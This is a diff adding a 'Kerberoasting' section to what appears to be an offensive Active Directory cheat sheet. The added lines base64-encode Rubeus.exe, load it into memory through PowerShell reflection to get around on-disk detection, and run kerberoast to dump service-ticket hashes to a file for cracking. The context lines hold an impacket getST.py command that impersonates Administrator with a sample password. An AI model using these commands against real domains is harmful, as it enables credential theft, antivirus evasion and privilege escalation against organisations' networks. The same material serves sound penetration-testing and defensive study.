@@ -761,6 +761,21 @@ Get service ticket using impacket
 python3 /usr/share/doc/python3-impacket/examples/getST.py -spn CIFS/HOST.DOMAIN.COM -impersonate 'Administrator' -dc-ip 1.1.1.1 'DOMAIN/rbcd$:Password12345'
 ```
 
+## Kerberoasting
+
+PowerShell load assembly Rubeus from base64
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt
+
+$a = Get-Content .\rubeus.txt
+$assem = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($a))
+```
+
+Export all available tickets
+```
+[Rubeus.Program]::Main("kerberoast /outfile:C:\temp\hashes.txt".Split())
+```
+
 ## Forest enum
 
 Get trusted domains
